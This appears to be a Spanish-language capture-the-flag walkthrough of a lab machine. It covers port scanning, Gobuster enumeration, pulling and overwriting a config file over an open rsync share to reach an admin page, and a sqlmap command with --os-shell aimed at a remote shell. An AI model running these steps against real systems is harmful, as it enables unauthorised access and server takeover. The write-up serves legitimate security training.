### Tags: `rsync` `sqlmap` `getcap`

# Escaneo (*22, 80, 139, 445*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
````

![image](https://github.com/user-attachments/assets/b5443b93-8748-44d6-9843-71d2a06dde6c)


# Port80 / Gobuster

Como vimos arriba en el reporte del escaneo la web es un *ubuntu Default Page* por ende tiramos de Gobuster

```ruby
gobuster dir -u http://<IP>/ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --no-error
```

Encontramos este directorio:

![image](https://github.com/user-attachments/assets/7e47c4c7-3b94-4b8d-95b9-3e2c77e181cd)

Si vamos en la web nos dice **403 Forbidden** y cuando hacemos `Ctrl + u` nos dice esto otro:

![image](https://github.com/user-attachments/assets/0aba8e1a-53d9-4dff-9216-6ee95cd55637)

Esto significa que actualmente estamos en el **entorno de producción** y tenemos que encontrar una manera de ir al entorno de producción. Para ello podemos consultar otros servicios. Entonces tenemos ``Rsync y 'Rsync`` se usa para **transferir** y **sincronizar** archivos entre una computadora y un disco duro externo y entre computadoras en red comparando los tiempos de modificación y los tamaños de los archivos. 
Lo que vamos a hacer ahora es verificar loa archivos del directorio `conf` y se hace de esta manera:

```ruby
 rsync -av rsync://<IP>/
```

![image](https://github.com/user-attachments/assets/3b03ee10-1fbf-4ee4-822f-ae331a0319bd)

Ahora nos metemos dentro de `Conf`

```ruby
rsync -av rsync://<IP>/Conf
```

![image](https://github.com/user-attachments/assets/8ecf56b3-74f8-4fbc-9a76-249de491c1d8)

Ahora lo que hacemos es **copiarnos** todos los archivos a nuestra máquina y verifiquemos si podemos obtener algo

```ruby
rsync -av rsync://<IP>/Conf ./mi_Conf
```

![image](https://github.com/user-attachments/assets/69154a29-52ff-41c4-9c94-a1af5c2d86dc)

Observando los distintos archivos, en `webapp.ini` encontramos credenciales de un **TomCat** que esta en `prod`

![image](https://github.com/user-attachments/assets/6cea61e9-e1e3-4ea2-acf2-a058c6b6e8d1)

Entonces lo que hacemos es cambiarlo a `dev` y enviarlo otra ves con el archivo cambiado 

```ruby
nano webapp.ini   #cambiar a dev
rsync -av webapp.ini rsync://<IP>/Conf/webapp.ini
```

![image](https://github.com/user-attachments/assets/073bb231-b8ba-46e9-911b-e5f0176fd0f5)

Ahora si recargamos la pagina en `/admin` podemos visualizar la web y no nos da el 403 de antes

![image](https://github.com/user-attachments/assets/a40d9cf5-1edc-48e5-9075-007c15add7d8)

# SQLMap

Capturamos la petición con Burp y lo guardamos para jugar con `sqlmap`
- `-dbs` enumere todas las bases de datos disponibles
- `--risk 3` nivel de riesgo (técnicas más agresivas y potencialmente más ruidosas)
- `--level 5` nivel de profundidad de las técnicas de explotación
- `--os-shell` Le indica a SQLmap que intente obtener un shell de sistema operativo en el servidor remoto

```ruby
sudo sqlmap -r SQL_burp -dbs --risk 3 --level 5 --os-shell 
```


